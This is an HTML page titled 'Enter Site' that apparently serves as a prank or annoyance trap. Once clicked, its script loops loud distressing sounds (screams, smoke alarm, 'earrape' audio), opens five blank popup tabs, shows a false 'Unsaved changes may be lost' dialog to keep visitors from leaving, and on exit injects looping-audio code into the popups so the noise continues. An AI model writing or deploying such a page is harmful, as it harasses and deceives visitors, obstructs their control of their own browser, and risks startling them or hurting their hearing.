<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Enter Site</title>
  <style>
    body {
      margin:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:black;
      color:white;
      font-family:sans-serif;
      font-size:2rem;
      cursor:pointer;
    }
  </style>
</head>
<body>
  <div id="enter">Enter Site</div>

  <script>
    const enter = document.getElementById("enter");
    const soundFiles = [
      "another-loud-no-82703.mp3",
      "loud-smoke-alarm-unplug-26528.mp3",
      "loud-fog-horn-47514.mp3",
      "big-aaaaaaaaaah-103115.mp3",
      "scream-meme-earrape.mp3",
      "shrek-oh-hello-there_nhnoZHY.mp3",
      "metal-pipe-clang.mp3"
    ];

    let preOpened = [];

    function playRandom() {
      const file = soundFiles[Math.floor(Math.random() * soundFiles.length)];
      const audio = new Audio(file);
      audio.play().catch(()=>{});
      audio.onended = playRandom;
    }

    enter.addEventListener("click", () => {
      document.body.innerHTML = "";
      document.body.style.background = "black";
      document.body.style.cursor = "default";
      playRandom();

      // Pre-open 5 blank tabs (but don't write into them yet)
      for (let i = 0; i < 5; i++) {
        const w = window.open("about:blank", "_blank");
        if (w) preOpened.push(w);
      }

      // Show the confirm dialog
      window.onbeforeunload = () => "Unsaved changes may be lost";

      // When leaving, fill those pre-opened tabs with noise code
      window.addEventListener("unload", () => {
        preOpened.forEach(blank => {
          if (!blank.closed) {
            blank.document.write(`
              <html>
                <body style="background:black;margin:0">
                  <script>
                    const sounds = ${JSON.stringify(soundFiles)};
                    function loop() {
                      const f = sounds[Math.floor(Math.random() * sounds.length)];
                      const a = new Audio(f);
                      a.play().catch(()=>{});
                      a.onended = loop;
                    }
                    loop();
                  <\/script>
                </body>
              </html>
            `);
            blank.document.close();
          }
        });
      });
    });
  </script>
</body>
</html>
